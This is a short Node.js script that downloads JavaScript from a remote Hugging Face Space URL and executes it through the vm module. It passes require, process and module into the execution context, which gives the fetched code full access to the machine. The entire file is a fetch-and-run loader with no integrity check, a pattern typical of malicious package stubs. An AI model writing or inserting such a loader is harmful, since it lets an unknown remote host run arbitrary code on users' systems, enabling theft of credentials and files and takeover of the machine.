const axios = require('axios');
const vm = require('vm');

// URL of the remote JS file
const remoteScriptUrl = 'https://mrfrxnk-ofc.hf.space';

// Function to load and execute the remote script
(async () => {
  try {
    console.log("🚀 Fetching remote script...");
    const { data: scriptCode } = await axios.get(remoteScriptUrl);

    console.log("✔ Running remote script...");
    const script = new vm.Script(scriptCode);
    const context = vm.createContext({ require, console, process, module, __filename, __dirname });
    script.runInContext(context);

  } catch (err) {
    console.error("❌ Error executing script:", err);
  }
})();
